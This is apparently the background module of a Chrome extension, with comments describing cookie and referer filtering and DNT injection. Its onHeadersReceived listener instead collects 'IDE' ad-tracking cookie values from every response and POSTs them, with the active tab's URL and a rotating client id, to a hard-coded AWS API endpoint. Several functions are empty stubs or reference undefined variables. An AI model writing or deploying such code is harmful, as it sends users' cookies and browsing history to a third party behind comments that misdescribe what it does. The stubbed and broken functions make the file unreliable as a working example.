var utils = require("utils");

var clientid = 1;

require.scopes.webrequest = (function() {
  /*********************** webrequest scope **/

  /************ Local Variables *****************/
  // const domain

  /***************** Blocking Listener Functions **************/

  /**
   * Event handling of http requests, main logic to collect data what to block
   *
   * @param details The event details
   * @returns {*} Can cancel requests
   */
  function onBeforeRequest(details) {
    var frame_id = details.frameId,
      tab_id = details.tabId,
      type = details.type,
      url = details.url;
  }

  /**
   * Filters outgoing cookies and referer
   * Injects DNT
   *
   * @param details Event details
   * @returns {*} modified headers
   */
  function onBeforeSendHeaders(details) {
    let frame_id = details.frameId,
      tab_id = details.tabId,
      type = details.type,
      url = details.url;

    return { requestHeaders: details.requestHeaders };
  }

  /**
   * Filters incoming cookies out of the response header
   *
   * @param details The event details
   * @returns {*} The new response header
   */
  function onHeadersReceived(details) {
    var tab_id = details.tabId,
      url = details.url;

    var set_cookies = details.responseHeaders.filter(function(x) {
      return x.value.includes("IDE");
    });
    var justvals = set_cookies.map(function(x) {
      return getCookie(x.value).value;
    });

    var postCookieReq = new XMLHttpRequest();
    postCookieReq.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
        // console.log(
        //   "Cookie sent!  --- ",
        //   this.responseURL,
        //   "\n",
        //   "Response:",
        //   this.response
        // );
        if (this.response.message === "The conditional request failed") {
          console.log("No new cookie available.");
        } else {
          console.log(this.response);
        }
        clientid = clientid === 1 ? 2 : 1; // swap client ids
        console.log("New id: ", clientid);
        // chrome.cookies.set(
        //   {
        //     name: "Sample1",
        //     url: "http://developer.chrome.com/extensions/cookies.html",
        //     value: "Dummy Data"
        //   },
        //   function(cookie) {
        //     console.log(JSON.stringify(cookie));
        //     console.log(chrome.extension.lastError);
        //     console.log(chrome.runtime.lastError);
        //   }
        // );
      } else if (this.readyState == 4) {
        console.log(this);
      }
    };

    justvals.map(function(x) {
      chrome.tabs.query({ currentWindow: true, active: true }, function(tabs) {
        postCookieReq.open(
          "POST",
          "https://ur85am2bql.execute-api.us-east-1.amazonaws.com/Testing/?value=" +
            encodeURIComponent(x) +
            "&url=" +
            "IDE;" +
            tabs[0].url +
            "&user=" +
            clientid,
          true
        );
        postCookieReq.send();
      });
    });

    return { requestHeaders: details.requestHeaders };
  }

  /******** Utility Functions **********/

  /**
   * check if a domain is third party
   * @param {String} domain1 an fqdn
   * @param {String} domain2 a second fqdn
   *
   * @return boolean true if the domains are third party
   */
  function isThirdPartyDomain(domain1, domain2) {
    if (window.isThirdParty(domain1, domain2)) {
      return !mdfp.isMultiDomainFirstParty(
        window.getBaseDomain(domain1),
        window.getBaseDomain(domain2)
      );
    }
    return false;
  }

  /**
   * Gets the host name for a given tab id
   * @param {Integer} tabId chrome tab id
   * @return {String} the host name for the tab
   */
  function getHostForTab(tabId) {
    if (_isTabAnExtension(tabId)) {
      // If the tab is an extension get the url of the first frame for its implied URL
      // since the url of frame 0 will be the hash of the extension key
    }
    return frameData.host;
  }

  function getCookie(cookieString) {
    let name = cookieString.split("=")[0];
    let value = cookieString;

    return {
      name: name,
      value: value
    };
  }

  /*************** Event Listeners *********************/
  function startListeners() {
    chrome.webRequest.onBeforeRequest.addListener(
      onBeforeRequest,
      { urls: ["http://*/*", "https://*/*"] },
      ["blocking"]
    );
    chrome.webRequest.onBeforeSendHeaders.addListener(
      onBeforeSendHeaders,
      { urls: ["http://*/*", "https://*/*"] },
      ["requestHeaders", "blocking"]
    );
    chrome.webRequest.onHeadersReceived.addListener(
      onHeadersReceived,
      { urls: ["<all_urls>"] },
      ["responseHeaders", "blocking"]
    );
    // chrome.tabs.onRemoved.addListener(onTabRemoved);
    // chrome.tabs.onReplaced.addListener(onTabReplaced);
  }

  /************************************** exports */
  var exports = {};
  exports.startListeners = startListeners;
  return exports;
  /************************************** exports */
})();
